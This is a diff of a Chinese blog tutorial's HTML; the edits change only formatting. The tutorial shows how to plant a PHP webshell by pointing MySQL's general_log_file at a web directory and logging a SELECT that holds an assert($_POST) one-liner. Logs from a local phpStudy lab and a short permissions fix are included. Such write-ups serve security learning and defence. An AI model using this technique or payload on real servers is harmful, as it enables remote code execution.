@@ -122,42 +122,41 @@ TCP Port: 3306, Named Pipe: MySQL
 Time                 Id Command    Argument
 170323 18:08:54	   35 Quit
 </code></pre><p>目前是没有什么内容的。我们在控制台随便执行一个SQL：</p>
-<pre tabindex="0"><code>SELECT MD5('admin');
+<pre tabindex="0"><code>SELECT MD5(&#39;admin&#39;);
 </code></pre><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/de74f71e-4f5e-11ec-a2df-00d861bf4abb.jpg" alt="enter description here"></p>
 <p>贴出新的日志内容：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">C</span>:<span style="color:#960050;background-color:#1e0010">\</span>phpStu<span style="color:#960050;background-color:#1e0010">\</span>mysql<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>mysqld.exe, <span style="color:#66d9ef">Version</span>: <span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">53</span> (MySQL Community Server (GPL)). started <span style="color:#66d9ef">with</span>:
-TCP Port: <span style="color:#ae81ff">3306</span>, Named Pipe: MySQL
-Time                 Id Command    Argument
-<span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">08</span>:<span style="color:#ae81ff">54</span>	   <span style="color:#ae81ff">35</span> Quit	
-<span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">12</span>:<span style="color:#ae81ff">55</span>	   <span style="color:#ae81ff">36</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
-		   <span style="color:#ae81ff">36</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
-		   <span style="color:#ae81ff">36</span> Init DB	mysql
-		   <span style="color:#ae81ff">36</span> Query	<span style="color:#66d9ef">SHOW</span> MASTER LOGS
-		   <span style="color:#ae81ff">36</span> Quit	
-		   <span style="color:#ae81ff">37</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
-		   <span style="color:#ae81ff">37</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
-		   <span style="color:#ae81ff">37</span> Quit	
-<span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">21</span>	   <span style="color:#ae81ff">38</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
-		   <span style="color:#ae81ff">38</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
-		   <span style="color:#ae81ff">38</span> Query	<span style="color:#66d9ef">SELECT</span> MD5(<span style="color:#e6db74">&#39;admin&#39;</span>)
-		   <span style="color:#ae81ff">38</span> Quit
-
-</code></pre></div><p>可以清除的发现，日志文件同步保存了我们所有的SQL语句……猥琐的思路从脑海中喷发而出~ 我们要在站点目录下使用MySQL的日志功能创建一个shell.php</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">C</span>:<span style="color:#960050;background-color:#1e0010">\</span>phpStu<span style="color:#960050;background-color:#1e0010">\</span>mysql<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>mysqld.exe, <span style="color:#66d9ef">Version</span>: <span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">53</span> (MySQL Community Server (GPL)). started <span style="color:#66d9ef">with</span>:
+</span></span><span style="display:flex;"><span>TCP Port: <span style="color:#ae81ff">3306</span>, Named Pipe: MySQL
+</span></span><span style="display:flex;"><span>Time                 Id Command    Argument
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">08</span>:<span style="color:#ae81ff">54</span>	   <span style="color:#ae81ff">35</span> Quit	
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">12</span>:<span style="color:#ae81ff">55</span>	   <span style="color:#ae81ff">36</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">36</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">36</span> Init DB	mysql
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">36</span> Query	<span style="color:#66d9ef">SHOW</span> MASTER LOGS
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">36</span> Quit	
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">37</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">37</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">37</span> Quit	
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">21</span>	   <span style="color:#ae81ff">38</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">38</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">38</span> Query	<span style="color:#66d9ef">SELECT</span> MD5(<span style="color:#e6db74">&#39;admin&#39;</span>)
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">38</span> Quit
+</span></span></code></pre></div><p>可以清除的发现，日志文件同步保存了我们所有的SQL语句……猥琐的思路从脑海中喷发而出~ 我们要在站点目录下使用MySQL的日志功能创建一个shell.php</p>
 <p>首先查看目录中不存在shell.php这个文件：
 <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/deb692dc-4f5e-11ec-86f7-00d861bf4abb.jpg" alt="enter description here"></p>
 <p>（确保general_log 的值已经为ON，前面已经设置过了）然后设置general_log_file的值为我们一句话木马的绝对路径：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">global</span> general_log_file<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;C:/phpStu/WWW/shell.php&#39;</span>;
-</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/df0216b2-4f5e-11ec-b34f-00d861bf4abb.jpg" alt="enter description here"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">global</span> general_log_file<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;C:/phpStu/WWW/shell.php&#39;</span>;
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/df0216b2-4f5e-11ec-b34f-00d861bf4abb.jpg" alt="enter description here"></p>
 <p>我们再去看看站点下是否创建了这个文件：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/df450260-4f5e-11ec-9893-00d861bf4abb.jpg" alt="enter description here"></p>
 <p>创建成功，并且文件内容中也有日志的初始值。</p>
 <p>我们现在写入一句话~ 强调一下，SQL就是SQL，在保存到日志中的时候不会解析转译符号，不知道大家能否理解，我举一个例子：</p>
 <p>我们查询：</p>
-<pre tabindex="0"><code>SELECT '&lt;?php assert($_POST[\'admin\']);?&gt;;
+<pre tabindex="0"><code>SELECT &#39;&lt;?php assert($_POST[\&#39;admin\&#39;]);?&gt;;
 </code></pre><p>保存到日志中也会变成</p>
-<pre tabindex="0"><code>SELECT '&lt;?php assert($_POST[\'admin\']);?&gt;';
+<pre tabindex="0"><code>SELECT &#39;&lt;?php assert($_POST[\&#39;admin\&#39;]);?&gt;&#39;;
 </code></pre><p>php这边解析的时候就会报错，因此我们采用单引号与双引号公用的方式实现：</p>
-<pre tabindex="0"><code>SELECT '&lt;?php assert($_POST[&quot;admin&quot;]);?&gt;';
+<pre tabindex="0"><code>SELECT &#39;&lt;?php assert($_POST[&#34;admin&#34;]);?&gt;&#39;;
 PS：$_POST中不用引号也可以~
 </code></pre><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/dfa3cf84-4f5e-11ec-a772-00d861bf4abb.jpg" alt="enter description here"></p>
 <p>我们访问看看~</p>
@@ -165,23 +164,23 @@ PS：$_POST中不用引号也可以~
 <p>已经解析php了，我们同样测试一下是否能执行php代码吧 ~</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/e02a9848-4f5e-11ec-b1db-00d861bf4abb.jpg" alt="enter description here"></p>
 <p>贴出日志内容：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">C</span>:<span style="color:#960050;background-color:#1e0010">\</span>phpStu<span style="color:#960050;background-color:#1e0010">\</span>mysql<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>mysqld.exe, <span style="color:#66d9ef">Version</span>: <span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">53</span> (MySQL Community Server (GPL)). started <span style="color:#66d9ef">with</span>:
-TCP Port: <span style="color:#ae81ff">3306</span>, Named Pipe: MySQL
-Time                 Id Command    Argument
-		   <span style="color:#ae81ff">44</span> Quit	
-<span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">27</span>:<span style="color:#ae81ff">27</span>	   <span style="color:#ae81ff">45</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
-		   <span style="color:#ae81ff">45</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
-		   <span style="color:#ae81ff">45</span> Init DB	mysql
-		   <span style="color:#ae81ff">45</span> Query	<span style="color:#66d9ef">SHOW</span> MASTER LOGS
-<span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">27</span>:<span style="color:#ae81ff">28</span>	   <span style="color:#ae81ff">45</span> Quit	
-		   <span style="color:#ae81ff">46</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
-		   <span style="color:#ae81ff">46</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
-		   <span style="color:#ae81ff">46</span> Quit	
-<span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">28</span>:<span style="color:#ae81ff">01</span>	   <span style="color:#ae81ff">47</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
-		   <span style="color:#ae81ff">47</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
-		   <span style="color:#ae81ff">47</span> Query	<span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;&lt;?php assert($_POST[&#34;admin&#34;]);?&gt;&#39;</span>
-		   <span style="color:#ae81ff">47</span> Quit	
-</code></pre></div><h2 id="0x03-总结">0x03 总结</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">C</span>:<span style="color:#960050;background-color:#1e0010">\</span>phpStu<span style="color:#960050;background-color:#1e0010">\</span>mysql<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>mysqld.exe, <span style="color:#66d9ef">Version</span>: <span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">5</span>.<span style="color:#ae81ff">53</span> (MySQL Community Server (GPL)). started <span style="color:#66d9ef">with</span>:
+</span></span><span style="display:flex;"><span>TCP Port: <span style="color:#ae81ff">3306</span>, Named Pipe: MySQL
+</span></span><span style="display:flex;"><span>Time                 Id Command    Argument
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">44</span> Quit	
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">27</span>:<span style="color:#ae81ff">27</span>	   <span style="color:#ae81ff">45</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">45</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">45</span> Init DB	mysql
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">45</span> Query	<span style="color:#66d9ef">SHOW</span> MASTER LOGS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">27</span>:<span style="color:#ae81ff">28</span>	   <span style="color:#ae81ff">45</span> Quit	
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">46</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">46</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">46</span> Quit	
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">170323</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">28</span>:<span style="color:#ae81ff">01</span>	   <span style="color:#ae81ff">47</span> <span style="color:#66d9ef">Connect</span>	root<span style="color:#f92672">@</span>localhost <span style="color:#66d9ef">on</span> 
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">47</span> Query	<span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">NAMES</span> <span style="color:#e6db74">&#39;utf8&#39;</span> <span style="color:#66d9ef">COLLATE</span> <span style="color:#e6db74">&#39;utf8_general_ci&#39;</span>
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">47</span> Query	<span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;&lt;?php assert($_POST[&#34;admin&#34;]);?&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>		   <span style="color:#ae81ff">47</span> Quit	
+</span></span></code></pre></div><h2 id="0x03-总结">0x03 总结</h2>
 <p>在权限把控不严谨的情况下容易出现此类攻击，如果MySQL没有权限在站点根目录下创建文件的话也就不会发生这样的情况了。</p>
 <p>修复方案就是权限把控好就可以了 ~</p>
 
